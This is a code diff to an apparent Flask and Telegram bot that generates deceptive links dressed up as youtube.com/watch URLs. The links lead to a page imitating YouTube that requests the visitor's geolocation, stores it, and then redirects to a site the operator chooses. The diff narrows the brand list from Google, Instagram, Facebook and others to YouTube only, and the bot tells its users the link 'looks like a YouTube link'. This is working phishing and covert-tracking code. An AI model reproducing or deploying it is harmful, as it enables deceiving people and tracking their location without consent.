@@ -26,7 +26,7 @@ if not TELEGRAM_TOKEN:
 
 BASE_URL = os.environ.get('BASE_URL', 'https://youtube-com-t2rz.onrender.com')
 
-# Brand Templates
+# Only YouTube brand
 FAKE_DOMAINS = {
     'youtube': {
         'path': 'youtube.com/watch',
@@ -35,59 +35,11 @@ FAKE_DOMAINS = {
         'color': '#FF0000',
         'gradient': 'linear-gradient(135deg, #FF0000 0%, #cc0000 100%)',
         'favicon': 'https://www.youtube.com/favicon.ico'
-    },
-    'google': {
-        'path': 'google.com',
-        'name': 'Google',
-        'icon': '🔍',
-        'color': '#4285F4',
-        'gradient': 'linear-gradient(135deg, #4285F4 0%, #34A853 33%, #FBBC05 66%, #EA4335 100%)',
-        'favicon': 'https://www.google.com/favicon.ico'
-    },
-    'instagram': {
-        'path': 'instagram.com/p',
-        'name': 'Instagram',
-        'icon': '📸',
-        'color': '#E4405F',
-        'gradient': 'linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%)',
-        'favicon': 'https://www.instagram.com/favicon.ico'
-    },
-    'facebook': {
-        'path': 'facebook.com',
-        'name': 'Facebook',
-        'icon': '👍',
-        'color': '#1877F2',
-        'gradient': 'linear-gradient(135deg, #1877F2 0%, #0E5A9E 100%)',
-        'favicon': 'https://www.facebook.com/favicon.ico'
-    },
-    'twitter': {
-        'path': 'twitter.com',
-        'name': 'Twitter/X',
-        'icon': '🐦',
-        'color': '#1DA1F2',
-        'gradient': 'linear-gradient(135deg, #1DA1F2 0%, #0D8BD9 100%)',
-        'favicon': 'https://www.twitter.com/favicon.ico'
-    },
-    'whatsapp': {
-        'path': 'whatsapp.com',
-        'name': 'WhatsApp',
-        'icon': '💬',
-        'color': '#25D366',
-        'gradient': 'linear-gradient(135deg, #25D366 0%, #128C7E 100%)',
-        'favicon': 'https://www.whatsapp.com/favicon.ico'
-    },
-    'tiktok': {
-        'path': 'tiktok.com',
-        'name': 'TikTok',
-        'icon': '🎵',
-        'color': '#000000',
-        'gradient': 'linear-gradient(135deg, #ff0050 0%, #00f2ea 100%)',
-        'favicon': 'https://www.tiktok.com/favicon.ico'
     }
 }
 
-# Conversation states
-BRAND_SELECTION, WEBSITE_INPUT = range(2)
+# Conversation states - simplified to just WEBSITE_INPUT
+WEBSITE_INPUT = 1
 
 # Initialize Flask app
 app = Flask(__name__)
@@ -127,26 +79,14 @@ def generate_link(user_id, website_url, brand, chat_id):
     conn.commit()
     conn.close()
     
-    brand_info = FAKE_DOMAINS.get(brand, FAKE_DOMAINS['google'])
+    brand_info = FAKE_DOMAINS.get(brand, FAKE_DOMAINS['youtube'])
     fake_path = brand_info['path']
     return f"{BASE_URL}/{fake_path}/{link_id}"
 
 @app.route('/<path:fake_path>/<link_id>')
 def fake_domain_track(fake_path, link_id):
-    brand = None
-    for key, value in FAKE_DOMAINS.items():
-        if value['path'] == fake_path:
-            brand = key
-            break
-    
-    if not brand:
-        for key, value in FAKE_DOMAINS.items():
-            if value['path'] in fake_path:
-                brand = key
-                break
-    
-    if not brand:
-        return "Invalid link", 404
+    # Only YouTube brand
+    brand = 'youtube'
     
     conn = sqlite3.connect('location_tracker.db')
     c = conn.cursor()
@@ -158,7 +98,7 @@ def fake_domain_track(fake_path, link_id):
         return "Invalid link", 404
     
     website_url, status = result
-    brand_info = FAKE_DOMAINS[brand]
+    brand_info = FAKE_DOMAINS['youtube']
     
     return f'''
     <!DOCTYPE html>
@@ -166,13 +106,13 @@ def fake_domain_track(fake_path, link_id):
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>{brand_info['name']}</title>
-        <link rel="icon" href="{brand_info['favicon']}">
+        <title>YouTube</title>
+        <link rel="icon" href="https://www.youtube.com/favicon.ico">
         <style>
             * {{ margin: 0; padding: 0; box-sizing: border-box; }}
             body {{
                 font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-                background: {brand_info['gradient']};
+                background: linear-gradient(135deg, #FF0000 0%, #cc0000 100%);
                 min-height: 100vh;
                 display: flex;
                 justify-content: center;
@@ -189,7 +129,7 @@ def fake_domain_track(fake_path, link_id):
                 text-align: center;
             }}
             .brand-icon {{ font-size: 80px; margin-bottom: 10px; }}
-            .brand-name {{ color: {brand_info['color']}; font-size: 28px; font-weight: bold; }}
+            .brand-name {{ color: #FF0000; font-size: 28px; font-weight: bold; }}
             .subtitle {{ color: #666; margin: 10px 0 30px 0; font-size: 16px; }}
             .status {{
                 background: #f0f0f0;
@@ -204,7 +144,7 @@ def fake_domain_track(fake_path, link_id):
                 width: 40px;
                 height: 40px;
                 border: 4px solid #f3f3f3;
-                border-top: 4px solid {brand_info['color']};
+                border-top: 4px solid #FF0000;
                 border-radius: 50%;
                 animation: spin 1s linear infinite;
                 margin: 20px auto;
@@ -214,7 +154,7 @@ def fake_domain_track(fake_path, link_id):
                 100% {{ transform: rotate(360deg); }}
             }}
             .btn {{
-                background: {brand_info['color']};
+                background: #FF0000;
                 color: white;
                 border: none;
                 padding: 12px 30px;
@@ -226,13 +166,17 @@ def fake_domain_track(fake_path, link_id):
             }}
             .btn:hover {{ opacity: 0.9; }}
             .privacy {{ color: #999; font-size: 12px; margin-top: 20px; }}
+            .youtube-logo {{
+                font-size: 48px;
+                margin: 10px 0;
+            }}
         </style>
     </head>
     <body>
         <div class="container">
-            <div class="brand-icon">{brand_info['icon']}</div>
-            <div class="brand-name">{brand_info['name']}</div>
-            <div class="subtitle">Continue to {brand_info['name']}</div>
+            <div class="youtube-logo">▶️</div>
+            <div class="brand-name">YouTube</div>
+            <div class="subtitle">Continue to YouTube</div>
             <div class="status" id="status">📍 Requesting location...</div>
             <div class="loading" id="loader"></div>
             <button class="btn" id="retryBtn" onclick="retryLocation()">🔄 Retry</button>
@@ -395,49 +339,17 @@ def health():
 
 # Telegram Bot Handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = []
-    brand_list = list(FAKE_DOMAINS.keys())
-    
-    for i in range(0, len(brand_list), 2):
-        row = []
-        for brand in brand_list[i:i+2]:
-            brand_info = FAKE_DOMAINS[brand]
-            display_name = f"{brand_info['icon']} {brand_info['name']} ({brand_info['path']})"
-            row.append(InlineKeyboardButton(
-                display_name,
-                callback_data=f'brand_{brand}'
-            ))
-        keyboard.append(row)
-    
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
+    # YouTube is the only option - directly ask for website URL
     await update.message.reply_text(
-        "🎯 *Select Fake Domain for Your Link*\n\n"
-        "Choose which website your link should look like:\n"
-        "The link will appear to be from this domain.\n\n"
-        "Example: https://your-bot.com/youtube.com/watch/abc123",
-        reply_markup=reply_markup,
+        "🎯 *YouTube Location Tracker*\n\n"
+        "📝 *Please send me the website URL* where you want to redirect users after location capture.\n\n"
+        "Example: `https://your-website.com`\n\n"
+        "Or send `/cancel` to cancel.",
         parse_mode='Markdown'
     )
     
-    return BRAND_SELECTION
-
-async def brand_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    brand = query.data.replace('brand_', '')
-    context.user_data['brand'] = brand
-    brand_info = FAKE_DOMAINS[brand]
-    
-    await query.edit_message_text(
-        f"✅ Selected: {brand_info['icon']} *{brand_info['name']}*\n"
-        f"📝 Fake domain: {brand_info['path']}\n\n"
-        f"📝 *Now send me the REAL website URL* to redirect users to.\n\n"
-        f"Example: https://your-website.com\n\n"
-        f"Or send /cancel to cancel.",
-        parse_mode='Markdown'
-    )
+    # Store that we're using YouTube
+    context.user_data['brand'] = 'youtube'
     
     return WEBSITE_INPUT
 
@@ -445,7 +357,7 @@ async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     chat_id = str(update.effective_chat.id)
     website_url = update.message.text.strip()
-    brand = context.user_data.get('brand', 'google')
+    brand = context.user_data.get('brand', 'youtube')
     
     if not website_url.startswith(('http://', 'https://')):
         website_url = 'https://' + website_url
@@ -458,20 +370,20 @@ async def receive_website(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return WEBSITE_INPUT
     
     link = generate_link(user_id, website_url, brand, chat_id)
-    brand_info = FAKE_DOMAINS[brand]
+    brand_info = FAKE_DOMAINS['youtube']
     
     keyboard = [
-        [InlineKeyboardButton("📋 Copy Link", url=link)],
-        [InlineKeyboardButton("🔄 New Link", callback_data='new_link')]
+        [InlineKeyboardButton("📋 Copy YouTube Link", url=link)],
+        [InlineKeyboardButton("🔄 Generate New Link", callback_data='new_link')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        f"✅ Link Generated!\n\n"
+        f"✅ *YouTube Link Generated!*\n\n"
         f"🔗 {link}\n\n"
         f"🎭 Looks like: {brand_info['path']}\n"
         f"🌐 Redirects to: {website_url}\n\n"
-        f"Share this link - it looks like a {brand_info['name']} link!",
+        f"Share this link - it looks like a YouTube link!",
         reply_markup=reply_markup,
         parse_mode=None
     )
@@ -482,28 +394,17 @@ async def new_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    keyboard = []
-    brand_list = list(FAKE_DOMAINS.keys())
-    for i in range(0, len(brand_list), 2):
-        row = []
-        for brand in brand_list[i:i+2]:
-            brand_info = FAKE_DOMAINS[brand]
-            display_name = f"{brand_info['icon']} {brand_info['name']} ({brand_info['path']})"
-            row.append(InlineKeyboardButton(
-                display_name,
-                callback_data=f'brand_{brand}'
-            ))
-        keyboard.append(row)
-    
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
     await query.edit_message_text(
-        "🎯 *Select Fake Domain for New Link*",
-        reply_markup=reply_markup,
+        "🎯 *YouTube Location Tracker*\n\n"
+        "📝 *Please send me the website URL* for this new link.\n\n"
+        "Example: `https://your-website.com`\n\n"
+        "Or send `/cancel` to cancel.",
         parse_mode='Markdown'
     )
     
-    return BRAND_SELECTION
+    context.user_data['brand'] = 'youtube'
+    
+    return WEBSITE_INPUT
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -525,12 +426,10 @@ def main():
     
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     
+    # Create conversation handler
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('start', start)],
         states={
-            BRAND_SELECTION: [
-                CallbackQueryHandler(brand_selection, pattern='^brand_'),
-            ],
             WEBSITE_INPUT: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, receive_website),
                 CommandHandler('cancel', cancel)
@@ -539,7 +438,13 @@ def main():
         fallbacks=[CommandHandler('cancel', cancel)]
     )
     
+    # Add conversation handler
     application.add_handler(conv_handler)
+    
+    # Add a separate handler for /start to reset conversation
+    application.add_handler(CommandHandler('start', start), group=1)
+    
+    # Add other handlers
     application.add_handler(CallbackQueryHandler(new_link, pattern='^new_link$'))
     
     # Start Flask in background with single thread
